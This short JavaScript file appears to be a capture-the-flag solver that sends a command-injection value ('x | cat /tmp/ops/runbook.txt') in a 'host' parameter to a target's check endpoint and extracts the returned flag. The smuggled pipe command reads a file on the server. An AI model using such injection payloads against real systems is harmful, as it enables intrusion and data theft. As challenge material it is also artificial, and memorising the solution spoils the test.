// Benign solver: prints only the recovered flag, for the check harness.
const url = new URL('check', process.env.TARGET);
url.searchParams.set('host', 'x | cat /tmp/ops/runbook.txt');
const flag = /FLAG\{[^}]+\}/u.exec(await (await fetch(url)).text())?.[0];
if (!flag) process.exit(1);
process.stdout.write(flag);
